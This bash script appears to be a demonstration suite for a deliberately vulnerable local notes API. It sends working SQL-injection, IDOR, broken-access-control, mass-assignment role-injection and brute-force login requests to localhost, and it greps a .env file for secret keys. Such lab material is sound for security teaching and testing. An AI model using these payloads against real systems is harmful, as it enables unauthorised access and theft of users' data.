#!/bin/bash

# Colors for pretty output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

BASE_URL="http://127.0.0.1:8000/api"

echo -e "${BLUE}═══════════════════════════════════════════════════════════${NC}"
echo -e "${BLUE}     VULNAPI - Complete Vulnerability Testing Suite        ${NC}"
echo -e "${BLUE}═══════════════════════════════════════════════════════════${NC}"
echo ""

# Step 1: Create test users
echo -e "${YELLOW}[1/8] Creating test users...${NC}"

# Normal user
echo -e "Creating normal user..."
curl -s -X POST "$BASE_URL/register" \
  -H "Content-Type: application/json" \
  -d '{"name":"Normal User","email":"normal@test.com","password":"test123"}' | jq '.'

# Admin user via mass assignment (VULNERABILITY V4)
echo -e "${RED}[VULNERABILITY V4] Creating admin user with role injection...${NC}"
curl -s -X POST "$BASE_URL/register" \
  -H "Content-Type: application/json" \
  -d '{"name":"Hacker Admin","email":"hacker@evil.com","password":"hack123","role":"admin"}' | jq '.'

echo ""
echo -e "${YELLOW}[2/8] Logging in as normal user...${NC}"

# Login and save token
LOGIN_RESPONSE=$(curl -s -X POST "$BASE_URL/login" \
  -H "Content-Type: application/json" \
  -d '{"email":"normal@test.com","password":"test123"}')

TOKEN=$(echo $LOGIN_RESPONSE | jq -r '.token')

if [ "$TOKEN" = "null" ] || [ -z "$TOKEN" ]; then
    echo -e "${RED}Failed to get token! Trying with existing user...${NC}"
    LOGIN_RESPONSE=$(curl -s -X POST "$BASE_URL/login" \
      -H "Content-Type: application/json" \
      -d '{"email":"test@test.com","password":"123456"}')
    TOKEN=$(echo $LOGIN_RESPONSE | jq -r '.token')
fi

echo -e "${GREEN}Token obtained: ${TOKEN:0:50}...${NC}"

echo ""
echo -e "${YELLOW}[3/8] Creating notes...${NC}"

# Create note 1
curl -s -X POST "$BASE_URL/notes" \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"title":"My Secret Banking Info","body":"Account: 12345678, Password: mysecretpassword"}' | jq '.'

# Create note 2
curl -s -X POST "$BASE_URL/notes" \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"title":"Personal Diary","body":"Today was a good day. I learned about SQL injection."}' | jq '.'

echo ""
echo -e "${RED}═══════════════════════════════════════════════════════════${NC}"
echo -e "${RED}              TESTING VULNERABILITIES                       ${NC}"
echo -e "${RED}═══════════════════════════════════════════════════════════${NC}"
echo ""

echo -e "${RED}[V1] SQL INJECTION - Retrieving all users' notes${NC}"
echo -e "${YELLOW}This should return notes from ALL users (Alice, Bob, Admin, etc.)${NC}"
echo ""
curl -s -X GET "$BASE_URL/search?keyword=%' OR '1'='1" \
  -H "Authorization: Bearer $TOKEN" | jq '.'

echo ""
echo -e "${RED}[V2] IDOR - Accessing another user's note (Note ID 1)${NC}"
echo -e "${YELLOW}This should return Alice's shopping list (even though you're not Alice)${NC}"
echo ""
curl -s -X GET "$BASE_URL/notes/1" \
  -H "Authorization: Bearer $TOKEN" | jq '.'

echo ""
echo -e "${RED}[V2] IDOR - Accessing Bob's bank account (Note ID 3)${NC}"
echo -e "${YELLOW}This should return Bob's banking information${NC}"
echo ""
curl -s -X GET "$BASE_URL/notes/3" \
  -H "Authorization: Bearer $TOKEN" | jq '.'

echo ""
echo -e "${RED}[V3] BROKEN ACCESS CONTROL - Accessing admin users list${NC}"
echo -e "${YELLOW}This should show ALL users including admins (you're a normal user!)${NC}"
echo ""
curl -s -X GET "$BASE_URL/admin/users" \
  -H "Authorization: Bearer $TOKEN" | jq '.'

echo ""
echo -e "${RED}[V4] MASS ASSIGNMENT - Already demonstrated (created admin user)${NC}"
echo -e "${YELLOW}Check the admin user we created at the beginning - it has role: admin!${NC}"
echo ""

echo -e "${RED}[V5] NO RATE LIMITING - Sending 20 rapid login attempts${NC}"
echo -e "${YELLOW}All 20 should go through with no blocking or delays${NC}"
echo ""

for i in {1..20}; do
    RESPONSE=$(curl -s -o /dev/null -w "%{http_code}" -X POST "$BASE_URL/login" \
      -H "Content-Type: application/json" \
      -d '{"email":"normal@test.com","password":"wrongpassword"}')
    echo "Attempt $i: HTTP $RESPONSE"
done

echo ""
echo -e "${YELLOW}Notice: All 20 requests completed immediately with no rate limiting!${NC}"
echo -e "${YELLOW}In a secure app, you'd be blocked after 5 attempts.${NC}"

echo ""
echo -e "${RED}[V6] HARDCODED SECRETS - Check your .env file${NC}"
echo -e "${YELLOW}Your .env file contains:${NC}"
if [ -f ".env" ]; then
    grep -E "STRIPE_SECRET|MAIL_PASSWORD|AWS_SECRET|JWT_SECRET" .env | head -5
else
    echo "No .env file found in current directory"
fi
echo -e "${YELLOW}When you push to GitHub, Gitleaks will detect these as leaked secrets!${NC}"

echo ""
echo -e "${BLUE}═══════════════════════════════════════════════════════════${NC}"
echo -e "${GREEN}✅ VULNERABILITY DEMONSTRATION COMPLETE${NC}"
echo -e "${BLUE}═══════════════════════════════════════════════════════════${NC}"
echo ""
echo "Summary:"
echo "  ✅ V1 - SQL Injection: Retrieved all users' notes"
echo "  ✅ V2 - IDOR: Accessed other users' private notes"
echo "  ✅ V3 - Broken Access Control: Accessed admin endpoint as normal user"
echo "  ✅ V4 - Mass Assignment: Created admin user via role injection"
echo "  ✅ V5 - No Rate Limiting: Unlimited login attempts"
echo "  ✅ V6 - Hardcoded Secrets: Secrets present in .env file"